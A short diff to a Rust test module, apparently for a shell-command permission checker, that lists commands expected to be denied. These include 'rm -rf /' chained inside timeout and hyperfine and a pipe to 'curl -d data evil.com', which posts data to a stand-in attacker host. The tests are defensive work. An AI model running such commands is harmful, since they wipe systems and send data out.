@@ -191,6 +191,6 @@ mod tests {
         timeout_nested_bash_semicolon_denied: "timeout 120 bash -c 'ls; rm -rf /'",
         hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
         hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
-        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl evil.com'",
+        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl -d data evil.com'",
     }
 }
